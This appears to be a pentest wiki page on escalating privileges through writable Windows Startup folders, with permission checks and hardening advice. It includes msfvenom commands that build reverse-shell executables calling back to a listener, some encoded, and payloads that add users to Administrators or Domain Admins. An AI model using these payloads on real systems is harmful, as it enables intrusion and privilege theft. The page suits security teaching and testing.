# Privilege Escalation via Startup Applications

**Startup folders** can be abused by attackers (or red teamers) to **persist** on a system or escalate privileges if permissions are misconfigured.


## 1. User-Level Startup Folder

- **Path:**

```cmd
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

```cmd
%appdata%\Microsoft\Windows\Start Menu\Programs\Startup
```

- **Risk:**

  - Any standard user can place a malicious script or executable here.

  - It will run on next login with **user privileges**.

  - Not privilege escalation, but **persistence** is possible.


## 2. All Users Startup Folder

- **Path:**

```cmd
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
````

- **Risk:**

  - If a non-admin user has **write access** to this folder:

	- They can place a malicious file here.

	- It will run with the **privileges of whoever logs in**, including **admins** — this is **privilege escalation**.

- **Check permissions:**

```cmd
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
````

```cmd
Get-Acl "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" | Format-List
```

> Look for entries like `Everyone:(F)` or `Users:(M)` — this is a red flag.


## 3. Exploitation Path

> **Attack Path Example:**

1. Attacker compromises a **low-privilege account**.

2. Checks if `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` is **writable**.

3. Drops a **payload** or **reverse shell** shortcut/executable there.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.7 LPORT=443 -f exe -o test.exe
```

1. Waits for an **admin user to log in**.

2. Payload executes with **elevated rights**.


## 4. Generate Custom Payload

- Use msfvenom to generate a reverse shell or privilege escalation payload.

- Reverse Shell Example

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

- Encoded x64 Reverse Shell

```bash
msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=192.168.1.7 LPORT=443 --encoder x64/xor --iterations 9 --format exe --out rshell.exe
```

- Add User to Admin Group

```bash
msfvenom -p windows/exec CMD='net localgroup administrators test /add' -f exe -o adduser.exe
```

```bash
msfvenom -p windows/exec CMD='net group "Domain Admins" u1 /ADD /DOMAIN' -f exe -o adduser.exe
```


## Defense / Hardening

- Ensure correct **NTFS permissions**:

```cmd
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

> Should *not* be writable by standard users.

- Use **AppLocker** or **Windows Defender Application Control (WDAC)** to restrict what can be run.

- Monitor with **Sysmon** for:

  - Creation of `.lnk`, `.exe`, `.bat` files in Startup folders.

- Regularly audit startup entries (including registry-based ones).

## Related
- [Autorun Registry Persistence](Registry-Exploitation/Autorun-Registry-Persistence.md) — registry-based startup equivalent
- [Insecure Service Permissions(binPath)](Services-Exploitation/Insecure-Service-Permissions(binPath).md) — another writable-resource escalation
- [Escalation via RunAs](Escalation-via-RunAs.md) — alternative payload execution
- [Privilege Escalation Tools](Privilege-Escalation-Tools.md) — detect writable startup paths
